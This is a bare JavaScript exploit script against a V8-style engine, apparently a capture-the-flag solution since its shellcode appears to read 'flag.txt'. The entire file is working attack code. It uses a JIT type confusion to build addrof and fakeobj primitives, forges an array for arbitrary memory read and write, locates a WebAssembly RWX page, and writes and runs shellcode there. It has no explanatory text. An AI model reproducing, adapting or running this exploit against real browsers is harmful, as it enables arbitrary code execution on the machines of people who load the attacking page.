let buf = new ArrayBuffer(8);
let f64_buf = new Float64Array(buf);
let u64_buf = new Uint32Array(buf);

let fmap = 0x0804222d082439f1n;

function ftoi(val) {
    f64_buf[0] = val;
    return BigInt(u64_buf[0]) + (BigInt(u64_buf[1]) << 32n);
}

function itof(val) {
    u64_buf[0] = Number(val & 0xffffffffn);
    u64_buf[1] = Number(val >> 32n);
    return f64_buf[0];
}

function normalize_idx(idx) {
    let n = Number(idx);
    if (!Number.isInteger(n)) {
        throw new TypeError(``);
    }
    return n;
}

function addrof(obj) {
    let arr = [1.11111, 2.22222, 3.33333, 4.44444];

    function r(arr, idx) {
        idx = normalize_idx(idx);
        return arr[idx];
    }

    for (let i = 0; i < 0x100000; i++) {
        if (i == 0xfffff) {
            arr[0] = obj;
        }
        leak = r(arr, 0);
    }

    return ftoi(leak) & 0xffffffffn;
}

function fakeobj(addr) {
    let arr = [{'a':1}, {'b':2}, {'c':4}, {'d':4}];

    function r(arr, idx) {
        idx = normalize_idx(idx);
        return arr[idx];
    }

    addr = itof(addr);
    for (let i = 0; i < 0x100000; i++) {
        if (i == 0xfffff) {
            arr = [addr, 1.1, 1.1, 1.1];
        }
        obj = r(arr, 0);
    }

    return obj;
}

let wasm_code = new Uint8Array([0,97,115,109,1,0,0,0,1,133,128,128,128,0,1,96,0,1,127,3,130,128,128,128,0,1,0,4,132,128,128,128,0,1,112,0,0,5,131,128,128,128,0,1,0,1,6,129,128,128,128,0,0,7,145,128,128,128,0,2,6,109,101,109,111,114,121,2,0,4,109,97,105,110,0,0,10,138,128,128,128,0,1,132,128,128,128,0,0,65,42,11]);
let wasm_mod = new WebAssembly.Module(wasm_code);
let wasm_instance = new WebAssembly.Instance(wasm_mod);
let f = wasm_instance.exports.main;

let f_addr = addrof(f);
console.log('f @ 0x'+f_addr.toString(16));

let t_arr = [1.1234, 2.1234, 3.1234, 4.1234];
let t_arr_addr = addrof(t_arr);
console.log('t_arr @ 0x'+t_arr_addr.toString(16));

t_arr[0] = itof(fmap);
t_arr[1] = itof((0x8n << 0x20n) + f_addr);
t_arr[2] = itof(0x00000002080429d1n);
t_arr[3] = 0.0;

let t_arr_elements_addr = t_arr_addr + 0xc4n;
let f_arr = fakeobj(t_arr_elements_addr);
console.log('created f_arr obj @ 0x'+t_arr_elements_addr.toString(16));

function arb_r(addr) {
    t_arr[1] = itof((0x8n << 0x20n) + addr - 0x8n);
    return ftoi(f_arr[0]);
}

function arb_w(addr, val) {
    t_arr[1] = itof((0x8n << 0x20n) + addr - 0x8n);
    f_arr[0] = itof(val);
}

let wasm_i = (arb_r(f_addr+0xcn) & 0xffffffffn) - 0x114n;
let rwx = arb_r(wasm_i+0x68n);
console.log('rwx page @ 0x'+rwx.toString(16));

let ab = new ArrayBuffer(0x100);
let dv = new DataView(ab);
let ab_addr = addrof(ab);
console.log("ArrayBuffer object @ 0x"+ab_addr.toString(16));

arb_w(ab_addr+0x14n, rwx);

let shellcode = [0x273d8d48, 0x31000000, 0x2b8f6, 0x50f0000, 0x8948c789, 0xc2c748e6, 0x1000, 0x50fc031, 0x1bf, 0xb8c28900, 0x1, 0x6c66050f, 0x742e6761, 0x7478];
for (let i = 0; i < shellcode.length; i++) {
        dv.setUint32(4*i, shellcode[i], true);
}

f();
